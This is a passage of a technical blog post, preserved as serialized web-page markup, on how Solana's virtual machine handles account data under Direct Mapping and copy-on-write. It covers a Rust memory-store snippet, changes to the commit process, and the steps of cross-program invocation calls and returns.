token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\".\"]}],[\"$\",\"span\",\"code-segement645\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"vm_to_host\"]}],[\"$\",\"span\",\"code-segement646\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}],[\"$\",\"span\",\"code-segement647\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"vm_addr\"]}],[\"$\",\"span\",\"code-segement648\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}],[\"$\",\"span\",\"code-segement649\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" len\"]}],[\"$\",\"span\",\"code-segement650\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}],[\"$\",\"span\",\"code-segement651\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement652\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"{\"]}],[\"$\",\"span\",\"code-segement653\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--59\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[59]}],[\"$\",\"span\",\"code-segement655\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"                    \"]}],[\"$\",\"span\",\"code-segement656\",{\"className\":\"token token\",\"style\":{\"color\":\"#999\"},\"children\":[\"// Safety:\"]}],[\"$\",\"span\",\"code-segement657\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--60\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[60]}],[\"$\",\"span\",\"code-segement659\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"                    \"]}],[\"$\",\"span\",\"code-segement660\",{\"className\":\"token token\",\"style\":{\"color\":\"#999\"},\"children\":[\"// vm_to_host() succeeded so we know there's enough space to\"]}],[\"$\",\"span\",\"code-segement661\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--61\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[61]}],[\"$\",\"span\",\"code-segement663\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"                    \"]}],[\"$\",\"span\",\"code-segement664\",{\"className\":\"token token\",\"style\":{\"color\":\"#999\"},\"children\":[\"// store `value`\"]}],[\"$\",\"span\",\"code-segement665\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--62\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[62]}],[\"$\",\"span\",\"code-segement667\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"                    \"]}],[\"$\",\"span\",\"code-segement668\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"unsafe\"]}],[\"$\",\"span\",\"code-segement669\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement670\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"{\"]}],[\"$\",\"span\",\"code-segement671\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement672\",{\"className\":\"token token\",\"style\":{\"color\":\"#e2777a\"},\"children\":[\"ptr\"]}],[\"$\",\"span\",\"code-segement673\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"::\"]}],[\"$\",\"span\",\"code-segement674\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"write_unaligned\"]}],[\"$\",\"span\",\"code-segement675\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}],[\"$\",\"span\",\"code-segement676\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"host_addr \"]}],[\"$\",\"span\",\"code-segement677\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"as\"]}],[\"$\",\"span\",\"code-segement678\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement679\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"*\"]}],[\"$\",\"span\",\"code-segement680\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"mut\"]}],[\"$\",\"span\",\"code-segement681\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" _\"]}],[\"$\",\"span\",\"code-segement682\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}],[\"$\",\"span\",\"code-segement683\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" value\"]}],[\"$\",\"span\",\"code-segement684\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}],[\"$\",\"span\",\"code-segement685\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement686\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"}\"]}],[\"$\",\"span\",\"code-segement687\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\";\"]}],[\"$\",\"span\",\"code-segement688\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--63\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[63]}],[\"$\",\"span\",\"code-segement690\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"                    \"]}],[\"$\",\"span\",\"code-segement691\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"return\"]}],[\"$\",\"span\",\"code-segement692\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement693\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"ProgramResult\"]}],[\"$\",\"span\",\"code-segement694\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"::\"]}],[\"$\",\"span\",\"code-segement695\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"Ok\"]}],[\"$\",\"span\",\"code-segement696\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}],[\"$\",\"span\",\"code-segement697\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"host_addr\"]}],[\"$\",\"span\",\"code-segement698\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}],[\"$\",\"span\",\"code-segement699\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\";\"]}],[\"$\",\"span\",\"code-segement700\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--64\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[64]}],[\"$\",\"span\",\"code-segement702\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"                \"]}],[\"$\",\"span\",\"code-segement703\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"}\"]}],[\"$\",\"span\",\"code-segement704\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--65\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[65]}],\"                region\\n\",[\"$\",\"span\",\"line-number--66\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[66]}],[\"$\",\"span\",\"code-segement708\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"            \"]}],[\"$\",\"span\",\"code-segement709\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"}\"]}],[\"$\",\"span\",\"code-segement710\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--67\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[67]}],[\"$\",\"span\",\"code-segement712\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"            _ \"]}],[\"$\",\"span\",\"code-segement713\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"=\u003e\"]}],[\"$\",\"span\",\"code-segement714\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement715\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"{\"]}],[\"$\",\"span\",\"code-segement716\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--68\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[68]}],[\"$\",\"span\",\"code-segement718\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"                \"]}],[\"$\",\"span\",\"code-segement719\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"return\"]}],[\"$\",\"span\",\"code-segement720\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement721\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"generate_access_violation\"]}],[\"$\",\"span\",\"code-segement722\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}],[\"$\",\"span\",\"code-segement723\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"self\"]}],[\"$\",\"span\",\"code-segement724\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\".\"]}],[\"$\",\"span\",\"code-segement725\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"config\"]}],[\"$\",\"span\",\"code-segement726\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}],[\"$\",\"span\",\"code-segement727\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement728\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"AccessType\"]}],[\"$\",\"span\",\"code-segement729\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"::\"]}],[\"$\",\"span\",\"code-segement730\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"Store\"]}],[\"$\",\"span\",\"code-segement731\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}],[\"$\",\"span\",\"code-segement732\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" vm_addr\"]}],[\"$\",\"span\",\"code-segement733\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}],[\"$\",\"span\",\"code-segement734\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" len\"]}],[\"$\",\"span\",\"code-segement735\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}],[\"$\",\"span\",\"code-segement736\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" pc\"]}],[\"$\",\"span\",\"code-segement737\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}],[\"$\",\"span\",\"code-segement738\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--69\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[69]}],[\"$\",\"span\",\"code-segement740\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"            \"]}],[\"$\",\"span\",\"code-segement741\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"}\"]}],[\"$\",\"span\",\"code-segement742\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--70\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[70]}],[\"$\",\"span\",\"code-segement744\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"        \"]}],[\"$\",\"span\",\"code-segement745\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"}\"]}],[\"$\",\"span\",\"code-segement746\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\";\"]}],[\"$\",\"span\",\"code-segement747\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--71\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[71]}],\"\\n\",[\"$\",\"span\",\"line-number--72\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[72]}],[\"$\",\"span\",\"code-segement751\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"        \"]}],[\"$\",\"span\",\"code-segement752\",{\"className\":\"token token\",\"style\":{\"color\":\"#999\"},\"children\":[\"// slow path, handle writes that span multiple memory regions\"]}],[\"$\",\"span\",\"code-segement753\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--73\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[73]}],[\"$\",\"span\",\"code-segement755\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"        \"]}],[\"$\",\"span\",\"code-segement756\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"...\"]}],[\"$\",\"span\",\"code-segement757\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--74\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[74]}],[\"$\",\"span\",\"code-segement759\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    \"]}],[\"$\",\"span\",\"code-segement760\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"}\"]}],[\"$\",\"span\",\"code-segement761\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--75\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[75]}],[\"$\",\"span\",\"code-segement763\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    \"]}],[\"$\",\"span\",\"code-segement764\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"...\"]}],[\"$\",\"span\",\"code-segement765\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--76\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[76]}],[\"$\",\"span\",\"code-segement767\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\"]}],[\"$\",\"span\",\"code-segement768\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"}\"]}]]]}]}]}],\"\\n\",[\"$\",\"h3\",\"h3-16\",{\"className\":\"text-3xl py-4 border-b border-white/10\",\"children\":\"Commit Process Changes\"}],\"\\n\",[\"$\",\"p\",\"p-78\",{\"className\":\"text-xl py-3 text-pretty sm:text-justify\",\"children\":\"The new CoW strategy also changes how account data is committed due to the mapping constraints:\"}],\"\\n\",[\"$\",\"p\",\"p-79\",{\"className\":\"text-xl py-3 text-pretty sm:text-justify\",\"children\":[[\"$\",\"strong\",\"strong-0\",{\"children\":\"Directly Mapped Data\"}],\": The original data length portion has already been modified through direct mapping and requires no additional copying.\"]}],\"\\n\",[\"$\",\"p\",\"p-80\",{\"className\":\"text-xl py-3 text-pretty sm:text-justify\",\"children\":[[\"$\",\"strong\",\"strong-0\",{\"children\":\"Growth Area Data\"}],\": When programs expand account data using \",[\"$\",\"code\",\"code-0\",{\"className\":\"break-all rounded-sm px-1 py-0.4 border border-gray-600\",\"style\":{\"background\":\"#2d2d2d\",\"fontFamily\":\"Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace\",\"fontSize\":\"18px\"},\"children\":\"realloc()\"}],\", the new data initially lives in the reserved buffer space within the \",[\"$\",\"code\",\"code-1\",{\"className\":\"break-all rounded-sm px-1 py-0.4 border border-gray-600\",\"style\":{\"background\":\"#2d2d2d\",\"fontFamily\":\"Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace\",\"fontSize\":\"18px\"},\"children\":\"INPUT\"}],\" section. Since the reserved buffer isn't mapped to host memory (we can only map the exact current data size), an additional copy operation is required to move growth data from the unmapped reserved buffer to the actual account data buffer in host memory.\"]}],\"\\n\",[\"$\",\"p\",\"p-81\",{\"className\":\"text-xl py-3 text-pretty sm:text-justify\",\"children\":\"This mapping constraint means that while Direct Mapping eliminates copying for existing data, growth scenarios still require copying from the unmapped reserved space.\"}],\"\\n\",[\"$\",\"h3\",\"h3-17\",{\"className\":\"text-3xl py-4 border-b border-white/10\",\"children\":\"Impact on Cross-Program Invocation\"}],\"\\n\",[\"$\",\"p\",\"p-82\",{\"className\":\"text-xl py-3 text-pretty sm:text-justify\",\"children\":\"With data writes handled, the next thing to understand is how CPI works under the new design.\"}],\"\\n\",[\"$\",\"h4\",\"h4-9\",{\"className\":\"text-2xl py-4 border-b border-white/10\",\"children\":\"CPI Call Process\"}],\"\\n\",[\"$\",\"p\",\"p-83\",{\"className\":\"text-xl py-3 text-pretty sm:text-justify\",\"children\":\"The CPI call process remains quite similar to the original design. Most steps are unchanged:\"}],\"\\n\",[\"$\",\"ol\",\"ol-0\",{\"className\":\"text-xl py-2 text-pretty sm:text-justify\",\"style\":{\"display\":\"block\",\"listStyleType\":\"decimal\",\"paddingInlineStart\":\"40px\"},\"children\":[\"\\n\",[\"$\",\"li\",\"li-0\",{\"children\":\"Retrieve metadata of accounts involved in the CPI instruction\"}],\"\\n\",[\"$\",\"li\",\"li-1\",{\"children\":[\"Look up corresponding \",[\"$\",\"code\",\"code-0\",{\"className\":\"break-all rounded-sm px-1 py-0.4 border border-gray-600\",\"style\":{\"background\":\"#2d2d2d\",\"fontFamily\":\"Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace\",\"fontSize\":\"18px\"},\"children\":\"AccountSharedData\"}],\" from the TransactionContext\"]}],\"\\n\",[\"$\",\"li\",\"li-2\",{\"children\":[\"Translate guest addresses in \",[\"$\",\"code\",\"code-0\",{\"className\":\"break-all rounded-sm px-1 py-0.4 border border-gray-600\",\"style\":{\"background\":\"#2d2d2d\",\"fontFamily\":\"Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace\",\"fontSize\":\"18px\"},\"children\":\"AccountInfo\"}],\" into host pointers to construct \",[\"$\",\"code\",\"code-1\",{\"className\":\"break-all rounded-sm px-1 py-0.4 border border-gray-600\",\"style\":{\"background\":\"#2d2d2d\",\"fontFamily\":\"Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace\",\"fontSize\":\"18px\"},\"children\":\"CallerAccount\"}],\" structures\"]}],\"\\n\",[\"$\",\"li\",\"li-3\",{\"children\":[\"Update reserved buffer and validate account changes and write them back to \",[\"$\",\"code\",\"code-0\",{\"className\":\"break-all rounded-sm px-1 py-0.4 border border-gray-600\",\"style\":{\"background\":\"#2d2d2d\",\"fontFamily\":\"Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace\",\"fontSize\":\"18px\"},\"children\":\"AccountSharedData\"}]]}],\"\\n\",[\"$\",\"li\",\"li-4\",{\"children\":[\"Serialize \",[\"$\",\"code\",\"code-0\",{\"className\":\"break-all rounded-sm px-1 py-0.4 border border-gray-600\",\"style\":{\"background\":\"#2d2d2d\",\"fontFamily\":\"Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace\",\"fontSize\":\"18px\"},\"children\":\"AccountSharedData\"}],\" into callee program's \",[\"$\",\"code\",\"code-1\",{\"className\":\"break-all rounded-sm px-1 py-0.4 border border-gray-600\",\"style\":{\"background\":\"#2d2d2d\",\"fontFamily\":\"Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace\",\"fontSize\":\"18px\"},\"children\":\"INPUT\"}],\" section\"]}],\"\\n\"]}],\"\\n\",[\"$\",\"p\",\"p-84\",{\"className\":\"text-xl py-3 text-pretty sm:text-justify\",\"children\":[\"A minor difference is, before step 4 validation, instead of copying the entire account data, we only copy newly grown data that's still in the reserved buffer back to the newly allocated direct-mapped buffer and verify other fields then write them back into \",[\"$\",\"code\",\"code-0\",{\"className\":\"break-all rounded-sm px-1 py-0.4 border border-gray-600\",\"style\":{\"background\":\"#2d2d2d\",\"fontFamily\":\"Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace\",\"fontSize\":\"18px\"},\"children\":\"AccountSharedData\"}],\".\"]}],\"\\n\",[\"$\",\"p\",\"p-85\",{\"className\":\"text-xl py-3 text-pretty sm:text-justify\",\"children\":[\"$\",\"img\",\"img-0\",{\"src\":\"/blog/2025_06_27/new_cpi_call.png\",\"alt\":\"New CPI Call\"}]}],\"\\n\",[\"$\",\"h4\",\"h4-10\",{\"className\":\"text-2xl py-4 border-b border-white/10\",\"children\":\"CPI Return Process\"}],\"\\n\",[\"$\",\"p\",\"p-86\",{\"className\":\"text-xl py-3 text-pretty sm:text-justify\",\"children\":\"The major differences occur when returning from a CPI call. Since we're using direct mapping, Vector CoW operations might occur during nested calls, requiring us to check if the original data buffer mapping has been relocated.\"}],\"\\n\",[\"$\",\"p\",\"p-87\",{\"className\":\"text-xl py-3 text-pretty sm:text-justify\",\"children\":[\"1-1. Copy data from reserved buffer back to the directly mapped data buffer.\\n1-2. Validate all account changes using the same rules as single program execution\\n2. Check if data buffer was relocated during CoW operations, if relocation occurred, update the parent's \",[\"$\",\"code\",\"code-0\",{\"className\":\"break-all rounded-sm px-1 py-0.4 border border-gray-600\",\"style\":{\"background\":\"#2d2d2d\",\"fontFamily\":\"Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace\",\"fontSize\":\"18px\"},\"children\":\"MemoryRegion.host_addr\"}],\" to reflect the change\\n3. Ensure the account data length hasn't exceeded the limits expected by the caller program\\n4. Write the consolidated account changes back into the parent program's \",[\"$\",\"code\",\"code-1\",{\"className\":\"break-all rounded-sm px-1 py-0.4 border border-gray-600\",\"style\":{\"background\":\"#2d2d2d\",\"fontFamily\":\"Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace\",\"fontSize\":\"18px\"},\"children\":\"INPUT\"}],\" region\"]}],\"\\n\",[\"$\",\"p\",\"p-88\",{\"className\":\"text-xl py-3 text-pretty sm:text-justify\",\"children\":\"Notably, steps 2 is a new action introduced by Direct Mapping. Since Vector CoW operations might occur during nested calls, we must detect buffer relocations and update memory mappings to maintain consistency.\"}],\"\\n\",[\"$\",\"p\",\"p-89\",{\"className\":\"text-xl py-3 text-pretty sm:text-justify\",\"children\":[\"$\",\"img\",\"img-0\",{\"src\":\"/blog/2025_06_27/new_cpi_return.png\",\"alt\":\"New CPI Return\"}]}],\"\\n\",[\"$\",\"h3\",\"h3-18\",{\"className\":\"text-3xl py-4 border-b border-white/10\",\"children\":[\"The \",[\"$\",\"code\",\"code-0\",{\"className\":\"break-all rounded-sm px-1 py-0.4 border border-gray-600\",\"style\":{\"background\":\"#2d2d2d\",\"fontFamily\":\"Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace\",\"fontSize\":\"18px\"},\"children\":\"MemoryRegion\"}],\" Update Mechanism\"]}],\"\\n\",[\"$\",\"p\",\"p-90\",{\"className\":\"text-xl py-3 text-pretty sm:text-justify\",\"children\":[\"When CoW operations relocate account data buffers during CPI execution, the parent program's \",[\"$\",\"code\",\"code-0\",{\"className\":\"break-all rounded-sm px-1 py-0.4 border border-gray-600\",\"style\":{\"background\":\"#2d2d2d\",\"fontFamily\":\"Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace\",\"fontSize\":\"18px\"},\"children\":\"MemoryRegions\"}],\" still point to the old buffer locations, we need to update it to reflect the change. So how exactly does the update mechanism look like?\"]}],\"\\n\",[\"$\",\"p\",\"p-91\",{\"className\":\"text-xl py-3 text-pretty sm:text-justify\",\"children\":[[\"$\",\"code\",\"code-0\",{\"className\":\"break-all rounded-sm px-1 py-0.4 border border-gray-600\",\"style\":{\"background\":\"#2d2d2d\",\"fontFamily\":\"Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace\",\"fontSize\":\"18px\"},\"children\":\"MemoryRegion\"}],\" manage virtual-to-host address mappings, with each region covering non-overlapping virtual address ranges. When a buffer gets relocated, we need to identify which specific \",[\"$\",\"code\",\"code-1\",{\"className\":\"break-all rounded-sm px-1 py-0.4 border border-gray-600\",\"style\":{\"background\":\"#2d2d2d\",\"fontFamily\":\"Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace\",\"fontSize\":\"18px\"},\"children\":\"MemoryRegion\"}],\" needs updating and modify its \",[\"$\",\"code\",\"code-2\",{\"className\":\"break-all rounded-sm px-1 py-0.4 border border-gray-600\",\"style\":{\"background\":\"#2d2d2d\",\"fontFamily\":\"Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace\",\"fontSize\":\"18px\"},\"children\":\"host_addr\"}],\" to point to the new location.\"]}],\"\\n\",[\"$\",\"p\",\"p-92\",{\"className\":\"text-xl py-3 text-pretty sm:text-justify\",\"children\":[\"Solana uses the \",[\"$\",\"code\",\"code-0\",{\"className\":\"break-all rounded-sm px-1 py-0.4 border border-gray-600\",\"style\":{\"background\":\"#2d2d2d\",\"fontFamily\":\"Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace\",\"fontSize\":\"18px\"},\"children\":\"vm_data_addr\"}],\" field stored in \",[\"$\",\"code\",\"code-1\",{\"className\":\"break-all rounded-sm px-1 py-0.4 border border-gray-600\",\"style\":{\"background\":\"#2d2d2d\",\"fontFamily\":\"Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace\",\"fontSize\":\"18px\"},\"children\":\"CallerAccount\"}],\" to locate the correct \",[\"$\",\"code\",\"code-2\",{\"className\":\"break-all rounded-sm px-1 py-0.4 border border-gray-600\",\"style\":{\"background\":\"#2d2d2d\",\"fontFamily\":\"Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace\",\"fontSize\":\"18px\"},\"children\":\"MemoryRegion\"}],\":\"]}],\"\\n\",[\"$\",\"ol\",\"ol-1\",{\"className\":\"text-xl py-2 text-pretty 